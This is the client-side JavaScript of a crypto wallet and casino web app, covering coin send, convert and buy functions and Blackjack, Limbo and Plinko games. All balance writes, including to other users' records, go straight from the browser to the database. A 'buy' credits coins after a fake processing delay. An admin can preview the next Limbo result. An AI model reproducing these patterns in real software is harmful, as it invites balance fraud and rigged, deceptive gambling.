  function fmtExpiry(el) { let v=el.value.replace(/\D/g,'').slice(0,4); if(v.length>=3) v=v.slice(0,2)+'/'+v.slice(2); el.value=v; }
  function updateCard() {
    const num=document.getElementById('inp-number')?.value||'';
    const expiry=document.getElementById('inp-expiry')?.value||'';
    const cvv=document.getElementById('inp-cvv')?.value||'';
    const name=document.getElementById('inp-name')?.value||'';
    const clean=num.replace(/\s/g,'');
    const groups=clean.match(/.{1,4}/g)||[]; const padded=[...groups];
    while(padded.length<4) padded.push('');
    document.getElementById('cc-number').textContent=padded.map(g=>g?g+'•'.repeat(Math.max(0,4-g.length)):'••••').join(' ');
    const exEl=document.getElementById('cc-expiry'); exEl.textContent=expiry||'MM/YY'; exEl.className='card-field-value'+(!expiry?' placeholder':'');
    const cvvEl=document.getElementById('cc-cvv'); cvvEl.textContent=cvv?'•'.repeat(cvv.length):'•••'; cvvEl.className='card-field-value'+(!cvv?' placeholder':'');
    const nmEl=document.getElementById('cc-name'); nmEl.textContent=name.toUpperCase()||'YOUR NAME'; nmEl.className='card-field-value'+(!name?' placeholder':'');
    const ok=clean.length===16&&expiry.length===5&&cvv.length===3&&name.trim();
    const p=document.getElementById('pay-btn');
    if(p){p.style.opacity=ok?'1':'0.35';p.style.cursor=ok?'pointer':'not-allowed';p.disabled=!ok;}
  }

  function closeModal() { document.getElementById('modal-bg').classList.remove('open'); }

  async function doSend() {
    const amt=parseFloat(document.getElementById('m-amt').value)||0;
    const addr=document.getElementById('m-addr').value.trim();
    const coin=document.getElementById('m-coin').value;
    if(amt<=0){showToast('Enter a valid amount',true);return;}
    if(!addr){showToast('Enter a wallet address',true);return;}
    if(addr===currentUser.wallet_address){showToast("That's your own address",true);return;}
    const coinUsd=(currentUser.holdings[coin]||0)*prices[coin];
    if(amt>coinUsd){showToast('Insufficient '+coin+' balance',true);return;}
    const recRes=await supa('users?wallet_address=eq.'+encodeURIComponent(addr)+'&select=*');
    if(!recRes.ok||!recRes.data||recRes.data.length===0){showToast('Wallet address not found',true);return;}
    const recipient=recRes.data[0];
    const sH={...currentUser.holdings}; sH[coin]=Math.max(0,(sH[coin]||0)-amt/prices[coin]);
    const rH={...(recipient.holdings||{BTC:0,ETH:0,USDT:0,SOL:0})}; rH[coin]=(rH[coin]||0)+amt/prices[coin];
    await supa('users?id=eq.'+currentUser.id,'PATCH',{balance:computeBal(sH),holdings:sH});
    await supa('users?id=eq.'+recipient.id,'PATCH',{balance:computeBal(rH),holdings:rH});
    await supa('transactions','POST',{from_user:currentUser.id,to_user:recipient.id,coin,amount:amt,type:'send'});
    currentUser.holdings=sH; currentUser.balance=computeBal(sH); saveSession(currentUser);
    closeModal(); showToast('Sent '+fmt(amt)+' to '+addr);
    loadUserData(); loadTransactions();
  }

  async function doConvert() {
    const amt=parseFloat(document.getElementById('c-amt').value)||0;
    const from=document.getElementById('c-from').value;
    const to=document.getElementById('c-to').value;
    if(amt<=0){showToast('Enter an amount',true);return;}
    if(from===to){showToast('Pick different coins',true);return;}
    const coinUsd=(currentUser.holdings[from]||0)*prices[from];
    if(amt>coinUsd){showToast('Insufficient '+from+' balance',true);return;}
    const h={...currentUser.holdings};
    h[from]=Math.max(0,(h[from]||0)-amt/prices[from]);
    h[to]=(h[to]||0)+amt/prices[to];
    const nb=computeBal(h);
    await supa('users?id=eq.'+currentUser.id,'PATCH',{holdings:h,balance:nb});
    await supa('transactions','POST',{from_user:currentUser.id,to_user:currentUser.id,coin:from+'_'+to,amount:amt,type:'convert'});
    currentUser.holdings=h; currentUser.balance=nb; saveSession(currentUser);
    closeModal(); showToast('Converted '+from+' → '+to);
    loadUserData(); loadTransactions();
  }

  async function doBuy() {
    const amt=parseFloat(document.getElementById('b-amt').value)||0;
    const coin=document.getElementById('b-coin').value;
    if(amt<=0){showToast('Enter an amount',true);return;}
    closeModal();
    const overlay=document.getElementById('auth-overlay');
    overlay.style.display='flex';
    requestAnimationFrame(()=>requestAnimationFrame(()=>overlay.style.opacity='1'));
    const h={...(currentUser.holdings||{BTC:0,ETH:0,USDT:0,SOL:0})};
    h[coin]=(h[coin]||0)+amt/prices[coin];
    const nb=computeBal(h);
    await supa('users?id=eq.'+currentUser.id,'PATCH',{balance:nb,holdings:h});
    await supa('transactions','POST',{from_user:null,to_user:currentUser.id,coin,amount:amt,type:'buy'});
    currentUser.holdings=h; currentUser.balance=nb; saveSession(currentUser);
    setTimeout(()=>{
      overlay.style.opacity='0';
      setTimeout(()=>overlay.style.display='none',300);
      loadUserData(); loadTransactions();
      showToast('Purchased '+coin+' for '+fmt(amt)+'!');
    },2500);
  }

  // ── BLACKJACK ────────────────────────────────────────────────────
  let bjDeck=[], bjPlayerHand=[], bjDealerHand=[], bjBet=0, bjActive=false;
  const bjSuits=['♠','♣','♥','♦'];
  const bjRanks=['A','2','3','4','5','6','7','8','9','10','J','Q','K'];

  function bjReset() { bjDeck=[]; bjPlayerHand=[]; bjDealerHand=[]; bjBet=0; bjActive=false; }

  function bjNewDeck() {
    const d=[];
    for(const s of bjSuits) for(const r of bjRanks) d.push({r,s});
    const full=[...d,...d,...d,...d,...d,...d];
    for(let i=full.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[full[i],full[j]]=[full[j],full[i]];}
    return full;
  }

  function bjCardVal(c){if(['J','Q','K'].includes(c.r))return 10;if(c.r==='A')return 11;return parseInt(c.r);}

  function bjHandScore(hand){
    let s=0,a=0;
    for(const c of hand){s+=bjCardVal(c);if(c.r==='A')a++;}
    while(s>21&&a>0){s-=10;a--;}
    return s;
  }

  function bjMakeCard(card, faceDown=false, delay=0) {
    const el=document.createElement('div');
    el.style.animationDelay = delay+'ms';
    if(faceDown){el.className='playing-card face-down';return el;}
    const isRed=['♥','♦'].includes(card.s);
    el.className='playing-card '+(isRed?'red':'black');
    el.innerHTML=`<div class="c-top"><span class="c-rank">${card.r}</span><span class="c-suit">${card.s}</span></div><div class="c-bot"><span class="c-rank">${card.r}</span><span class="c-suit">${card.s}</span></div>`;
    return el;
  }

  async function bjDealCard(hand, container, faceDown=false, delayMs=0) {
    await new Promise(r=>setTimeout(r,delayMs));
    const card = bjDeck.pop();
    hand.push(card);
    container.appendChild(bjMakeCard(card, faceDown));
    return card;
  }

  function bjUpdateScore(elId, hand, hidden=false) {
    const el=document.getElementById(elId);
    if(!el) return;
    el.style.display='inline-flex';
    el.textContent = hidden ? '?' : bjHandScore(hand);
    const wrap = document.getElementById(elId.replace('score','score-wrap'));
    if(wrap) wrap.style.display='block';
  }

  function bjSetActions(active) {
    const actions=document.getElementById('bj-actions');
    const dealRow=document.getElementById('bj-deal-row');
    const betRow=document.getElementById('bj-bet-row');
    if(!actions) return;
    actions.style.display = active ? 'grid' : 'none';
    if(dealRow) dealRow.style.display = active ? 'none' : 'block';
    if(betRow) betRow.style.display = active ? 'none' : 'flex';
  }

  async function bjDeal() {
    const bet=getBet('bj-bet'); if(!bet) return;
    bjBet=bet; bjActive=true;
    bjDeck=bjNewDeck(); bjPlayerHand=[]; bjDealerHand=[];
    const pc=document.getElementById('bj-player-cards');
    const dc=document.getElementById('bj-dealer-cards');
    if(!pc||!dc) return;
    pc.innerHTML=''; dc.innerHTML='';
    document.getElementById('bj-player-score').style.display='none';
    document.getElementById('bj-dealer-score').style.display='none';
    const dsw=document.getElementById('bj-dealer-score-wrap');
    if(dsw) dsw.style.display='none';
    document.getElementById('bj-result').className='game-result';
    document.getElementById('bj-result').textContent='Dealing…';
    bjSetActions(false);
    await updateBalance(-bet,'Blackjack (bet)');
    // Deal with animation delays
    await bjDealCard(bjPlayerHand, pc, false, 0);
    await bjDealCard(bjDealerHand, dc, false, 200);
    await bjDealCard(bjPlayerHand, pc, false, 400);
    await bjDealCard(bjDealerHand, dc, true, 600); // dealer hole card face down
    await new Promise(r=>setTimeout(r,700));
    bjUpdateScore('bj-player-score', bjPlayerHand);
    bjUpdateScore('bj-dealer-score', bjDealerHand, true);
    const ps=bjHandScore(bjPlayerHand), ds=bjHandScore(bjDealerHand);
    if(ps===21&&ds===21){return bjFinish('push');}
    if(ps===21){return bjFinish('blackjack');}
    document.getElementById('bj-result').textContent='Hit or Stand?';
    bjSetActions(true);
  }

  async function bjHit() {
    if(!bjActive) return;
    const pc=document.getElementById('bj-player-cards');
    await bjDealCard(bjPlayerHand, pc, false, 0);
    bjUpdateScore('bj-player-score', bjPlayerHand);
    const ps=bjHandScore(bjPlayerHand);
    if(ps>21) bjFinish('bust');
    else if(ps===21) bjStand();
    else document.getElementById('bj-double-btn').disabled=true;
  }

  async function bjDouble() {
    if(!bjActive||bjPlayerHand.length>2) return;
    await updateBalance(-bjBet,'Blackjack (double)');
    bjBet*=2;
    const pc=document.getElementById('bj-player-cards');
    await bjDealCard(bjPlayerHand, pc, false, 0);
    bjUpdateScore('bj-player-score', bjPlayerHand);
    const ps=bjHandScore(bjPlayerHand);
    if(ps>21) bjFinish('bust'); else bjStand();
  }

  async function bjStand() {
    if(!bjActive) return;
    bjSetActions(false);
    // Flip dealer hole card
    const dc=document.getElementById('bj-dealer-cards');
    if(dc&&dc.children[1]){
      const faceDown=dc.children[1];
      const realCard=bjDealerHand[1];
      const isRed=['♥','♦'].includes(realCard.s);
      faceDown.className='playing-card '+(isRed?'red':'black');
      faceDown.innerHTML=`<div class="c-top"><span class="c-rank">${realCard.r}</span><span class="c-suit">${realCard.s}</span></div><div class="c-bot"><span class="c-rank">${realCard.r}</span><span class="c-suit">${realCard.s}</span></div>`;
    }
    bjUpdateScore('bj-dealer-score', bjDealerHand, false);
    // Dealer draws to 17
    let delay=200;
    while(bjHandScore(bjDealerHand)<17){
      await bjDealCard(bjDealerHand, dc, false, delay);
      bjUpdateScore('bj-dealer-score', bjDealerHand);
      delay+=300;
    }
    await new Promise(r=>setTimeout(r,delay));
    const ps=bjHandScore(bjPlayerHand), ds=bjHandScore(bjDealerHand);
    if(ds>21||ps>ds) bjFinish('win');
    else if(ps===ds) bjFinish('push');
    else bjFinish('lose');
  }

  async function bjFinish(outcome) {
    bjActive=false; bjSetActions(false);
    const r=document.getElementById('bj-result');
    let payout=0;
    if(outcome==='blackjack'){payout=bjBet*2.5;r.className='game-result win';r.textContent='🃏 Blackjack! Won '+fmt(bjBet*1.5)+'!';}
    else if(outcome==='win'){payout=bjBet*2;r.className='game-result win';r.textContent='✅ You win! +'+fmt(bjBet);}
    else if(outcome==='push'){payout=bjBet;r.className='game-result';r.textContent='🤝 Push — bet returned';}
    else if(outcome==='bust'){r.className='game-result lose';r.textContent='💥 Bust! Lost '+fmt(bjBet);}
    else{r.className='game-result lose';r.textContent='❌ Dealer wins. Lost '+fmt(bjBet);}
    if(payout>0) await updateBalance(payout,'Blackjack (payout)');
    // Show deal button again
    const dealRow=document.getElementById('bj-deal-row');
    const betRow=document.getElementById('bj-bet-row');
    if(dealRow){dealRow.style.display='block';document.getElementById('bj-deal-btn').textContent='Deal Again';}
    if(betRow) betRow.style.display='flex';
  }

  // ── LIMBO ─────────────────────────────────────────────────────────
  function updateLimboChance() {
    const target = parseFloat(document.getElementById('limbo-target')?.value) || 2;
    const clamped = Math.max(1.01, target);
    const chance = Math.min(99, (1 / clamped) * 100);
    const el = document.getElementById('limbo-chance');
    if (el) el.textContent = chance.toFixed(2) + '%';
    // Move the target line: chance% fills from left, so line sits at chance%
    const line = document.getElementById('limbo-bar-target');
    if (line) { line.style.display = 'block'; line.style.left = chance.toFixed(1) + '%'; }
  }

  function generateLimboResult() {
    // House edge ~1%. Result distribution: lots of low, rare highs
    const r = Math.random();
    if (r < 0.01) return 0.01 + Math.random() * 0.99; // instant bust zone
    const raw = 1 / (Math.random()); // 1x to infinity
    return Math.min(1000, parseFloat((raw * 0.99).toFixed(2)));
  }

  let limboAdminResult = null;

  async function playLimbo() {
    const bet = getBet('limbo-bet'); if (!bet) return;
    const target = parseFloat(document.getElementById('limbo-target')?.value) || 2;
    if (target < 1.01) { showToast('Minimum target is 1.01×', true); return; }

    const btn = document.getElementById('limbo-play-btn');
    if (btn) btn.disabled = true;

    const result = (isAdmin() && limboAdminResult !== null) ? limboAdminResult : generateLimboResult();
    limboAdminResult = null;
    const won = result >= target;
    const payout = won ? bet * target : 0;

    await updateBalance(-bet, 'Limbo (bet)');
    if (won) await updateBalance(payout, 'Limbo (win)');

    // --- Bar animation ---
    // Win chance of target = (1/target)*100, that's where the line is
    // Result fill: map result onto bar. Cap at 99x for visual. result/99 * 100%
    // If won: fill goes AT LEAST to the target line (and beyond if result > target)
    // If lost: fill stops before the target line
    const targetChancePct = Math.min(99, (1 / target) * 100); // where target line sits
    const resultChancePct = Math.min(99, (1 / Math.max(1.01, result)) * 100);
    // For won: fill = resultChancePct (result is >= target so resultChancePct <= targetChancePct — bar fills past line)
    // For lost: fill = resultChancePct (result < target so resultChancePct > targetChancePct — bar stops short)
    const fillPct = 100 - resultChancePct; // invert: higher result = more fill

    const fill = document.getElementById('limbo-bar-fill');
    const multEl = document.getElementById('limbo-mult');

    // Reset fill first
    if (fill) { fill.className = 'limbo-bar-fill'; fill.style.width = '0%'; }
    if (multEl) { multEl.className = 'limbo-mult'; multEl.textContent = '–'; }

    // Small frame delay to let reset render, then animate
    await new Promise(r => setTimeout(r, 30));

    if (fill) {
      fill.className = 'limbo-bar-fill ' + (won ? 'win' : 'lose');
      fill.style.width = Math.max(4, fillPct) + '%';
    }

    // Animate multiplier text
    if (multEl) {
      await new Promise(r => setTimeout(r, 80));
      const fresh = multEl.cloneNode(false);
      fresh.className = 'limbo-mult animating ' + (won ? 'win' : 'lose');
      fresh.textContent = result.toFixed(2) + '×';
      multEl.parentNode.replaceChild(fresh, multEl);
      setTimeout(() => fresh.classList.remove('animating'), 350);
    }

    // History pill
    const hist = document.getElementById('limbo-history');
    if (hist) {
      const pill = document.createElement('div');
      pill.className = 'limbo-pill ' + (won ? 'win' : 'lose');
      pill.textContent = result.toFixed(2) + '×';
      hist.insertBefore(pill, hist.firstChild);
      while (hist.children.length > 8) hist.removeChild(hist.lastChild);
    }

    // Update admin bar with next result
    if (isAdmin()) {
      limboAdminResult = generateLimboResult();
      const hint = document.getElementById('admin-hint');
      if (hint) hint.textContent = '🚀 Next: ' + limboAdminResult.toFixed(2) + '×';
    }

    showToast(won ? '🚀 Hit ' + result.toFixed(2) + '× — Won ' + fmt(payout - bet) + '!' : '💀 Got ' + result.toFixed(2) + '× — Lost ' + fmt(bet), !won);
    if (btn) btn.disabled = false;
  }

  // ── PLINKO ────────────────────────────────────────────────────────
  const PLINKO_ROWS = 14;
  const PLINKO_MULTS  = [16, 9, 2, 1.4, 1.4, 1.2, 1.1, 1, 0.5, 1, 1.1, 1.2, 1.4, 1.4, 2, 9, 16];
  const PLINKO_COLORS = ['#ef4444','#f97316','#eab308','#84cc16','#22c55e','#86efac','#d1fae5','#e0f2fe','#fef3c7','#e0f2fe','#d1fae5','#86efac','#22c55e','#84cc16','#eab308','#f97316','#ef4444'];
  let plinkoAnim = null;
  let plinkoBallActive = false;

  // Compute peg grid — centered triangle, same spacing horizontally and vertically
  function getPegs(W, H) {
    const PAD_TOP = 28, PAD_BOT = 56, PAD_SIDE = 24;
    const cols0 = 3; // pegs in row 0
    const totalCols = cols0 + PLINKO_ROWS - 1; // pegs in last row = cols0 + PLINKO_ROWS - 1
    const usableW = W - PAD_SIDE * 2;
    const usableH = H - PAD_TOP - PAD_BOT;
    const spacingX = usableW / (totalCols - 1);
    const spacingY = usableH / (PLINKO_ROWS - 1);
    const pegs = [];
    for (let r = 0; r < PLINKO_ROWS; r++) {
      const n = cols0 + r;
      const rowWidth = (n - 1) * spacingX;
      const startX = (W - rowWidth) / 2;
      const y = PAD_TOP + r * spacingY;
      for (let c = 0; c < n; c++) {
        pegs.push({ x: startX + c * spacingX, y, r, c });
      }
    }
    return { pegs, spacingX, spacingY, PAD_TOP, PAD_BOT, PAD_SIDE };
  }

  function drawPlinkoBoard(ctx, W, H, ball, highlightBucket) {
    ctx.clearRect(0, 0, W, H);
    // Background
    ctx.fillStyle = '#0d1321';
    ctx.fillRect(0, 0, W, H);

    const { pegs } = getPegs(W, H);

    // Draw pegs
    pegs.forEach(p => {
      const near = ball && Math.hypot(p.x - ball.x, p.y - ball.y) < 18;
      ctx.beginPath();
      ctx.arc(p.x, p.y, 4.5, 0, Math.PI * 2);
      ctx.fillStyle = near ? '#93c5fd' : 'rgba(255,255,255,0.75)';
      if (near) { ctx.shadowColor = '#93c5fd'; ctx.shadowBlur = 8; }
      ctx.fill();
      ctx.shadowBlur = 0;
    });

    // Draw ball
    if (ball) {
      ctx.beginPath();
      ctx.arc(ball.x, ball.y, 9, 0, Math.PI * 2);
      const g = ctx.createRadialGradient(ball.x - 2, ball.y - 3, 1, ball.x, ball.y, 9);
      g.addColorStop(0, '#bfdbfe');
      g.addColorStop(1, '#2563eb');
      ctx.fillStyle = g;
      ctx.shadowColor = '#3b82f6';
      ctx.shadowBlur = 18;
      ctx.fill();
      ctx.shadowBlur = 0;
    }
  }

  function buildPlinkoBuckets(highlightIdx) {
    const wrap = document.getElementById('plinko-buckets');
    if (!wrap) return;
    wrap.innerHTML = PLINKO_MULTS.map((m, i) => {
      const col = PLINKO_COLORS[i];
      const isHit = i === highlightIdx;
      return `<div class="plinko-bucket" id="pb-${i}" style="background:${col}${isHit ? '55' : '18'};color:${col};border:1px solid ${col}${isHit ? 'cc' : '44'};transform:${isHit ? 'scale(1.18)' : 'scale(1)'};transition:all 0.2s;">${m}×</div>`;
    }).join('');
  }

  function initPlinko() {
    const canvas = document.getElementById('plinko-canvas');
    if (!canvas) return;
    // Resize canvas to match display size
    const rect = canvas.getBoundingClientRect();
    canvas.width = Math.round(rect.width) || 420;
    canvas.height = Math.round(rect.width * 0.85) || 360;
    const ctx = canvas.getContext('2d');
    drawPlinkoBoard(ctx, canvas.width, canvas.height, null, -1);
    buildPlinkoBuckets(-1);
  }

  function simulatePath() {
    // Returns array of 'L'/'R' decisions, length = PLINKO_ROWS - 1
    // Each decision moves between pegs in next row
    const path = [];
    for (let i = 0; i < PLINKO_ROWS - 1; i++) {
      path.push(Math.random() < 0.5 ? 'L' : 'R');
    }
    return path;
  }

  function buildWaypoints(W, H, path) {
    const { pegs, spacingX, spacingY, PAD_TOP } = getPegs(W, H);
    // Start: midpoint above first row of pegs, between peg 0 and 1 of row 0
    const firstRow = pegs.filter(p => p.r === 0);
    const startX = (firstRow[0].x + firstRow[1].x) / 2;
    const startY = PAD_TOP - 24;
    const waypoints = [{ x: startX, y: startY }];

    // After each bounce, ball is between two pegs in the NEXT row
    let colIdx = 0; // which gap we're currently in (0 = between peg 0 and 1 of current row)
    for (let r = 0; r < PLINKO_ROWS - 1; r++) {
      const curRow = pegs.filter(p => p.r === r);
      // Ball is between curRow[colIdx] and curRow[colIdx+1]
      // Add bounce point slightly above peg level
      const bx = (curRow[colIdx].x + curRow[colIdx + 1].x) / 2;
      const by = curRow[colIdx].y + spacingY * 0.3;
      waypoints.push({ x: bx, y: by });
      // Decision: go L keeps colIdx, go R increments colIdx
      if (path[r] === 'R') colIdx++;
      // Now arrive at next row between colIdx and colIdx+1
      const nextRow = pegs.filter(p => p.r === r + 1);
      const nx = (nextRow[colIdx].x + nextRow[colIdx + 1].x) / 2;
      const ny = nextRow[colIdx].y - spacingY * 0.15;
      waypoints.push({ x: nx, y: ny });
    }
    // Land in bucket
    const lastRow = pegs.filter(p => p.r === PLINKO_ROWS - 1);
    // bucketIndex = colIdx (0..PLINKO_ROWS-1)
    const bucketIndex = colIdx;
    // Final x = midpoint between lastRow[colIdx] and lastRow[colIdx+1] (or edge)
    const landX = colIdx < lastRow.length - 1
      ? (lastRow[colIdx].x + lastRow[colIdx + 1].x) / 2
      : lastRow[colIdx].x;
    const landY = lastRow[0].y + spacingY * 0.7;
    waypoints.push({ x: landX, y: landY });

    return { waypoints, bucketIndex };
  }

  async function plinkoDrop() {
    if (plinkoBallActive) return;
    const bet = getBet('plinko-bet'); if (!bet) return;
    const btn = document.getElementById('plinko-drop-btn');
    if (btn) btn.disabled = true;
    plinkoBallActive = true;

    await updateBalance(-bet, 'Plinko (bet)');

    const canvas = document.getElementById('plinko-canvas');
    if (!canvas) { plinkoBallActive = false; if (btn) btn.disabled = false; return; }
    const ctx = canvas.getContext('2d');
    const W = canvas.width, H = canvas.height;

    const path = simulatePath();
    const { waypoints, bucketIndex } = buildWaypoints(W, H, path);
    const mult = PLINKO_MULTS[bucketIndex];
    const payout = bet * mult;

    if (plinkoAnim) cancelAnimationFrame(plinkoAnim);

    // Physics: ease in/out between waypoints, gravity feel (faster going down, slower going up)
    let startTime = null;
    const MS_PER_SEGMENT = 120; // slower — 120ms per waypoint segment
    const totalTime = waypoints.length * MS_PER_SEGMENT;

    function easeInOut(t) { return t < 0.5 ? 2*t*t : -1+(4-2*t)*t; }

    function animate(ts) {
      if (!startTime) startTime = ts;
      const elapsed = Math.min(ts - startTime, totalTime);
      const rawSeg = elapsed / MS_PER_SEGMENT;
      const segIdx = Math.min(Math.floor(rawSeg), waypoints.length - 2);
      const t = easeInOut(rawSeg - segIdx);
      const from = waypoints[segIdx];
      const to = waypoints[Math.min(segIdx + 1, waypoints.length - 1)];
      const bx = from.x + (to.x - from.x) * t;
      const by = from.y + (to.y - from.y) * t;

      drawPlinkoBoard(ctx, W, H, { x: bx, y: by }, -1);

      if (elapsed < totalTime) {
        plinkoAnim = requestAnimationFrame(animate);
      } else {
        // Done
        drawPlinkoBoard(ctx, W, H, null, -1);
        buildPlinkoBuckets(bucketIndex);
        setTimeout(() => buildPlinkoBuckets(-1), 900);

        if (payout > 0) updateBalance(payout, 'Plinko (win)');
        const profit = payout - bet;
        showToast(profit > 0 ? '🔵 ' + mult + '× — Won ' + fmt(profit) + '!' : mult + '× — Lost ' + fmt(Math.abs(profit)), profit <= 0);
        plinkoBallActive = false;
        if (btn) btn.disabled = false;
      }
    }
    plinkoAnim = requestAnimationFrame(animate);
  }

  document.getElementById('modal-bg').addEventListener('click',function(e){if(e.target===this)closeModal();});
  document.addEventListener('keydown',e=>{if(e.key==='Enter'&&document.getElementById('auth-screen').style.display!=='none')handleAuth();});
</script>
</body>
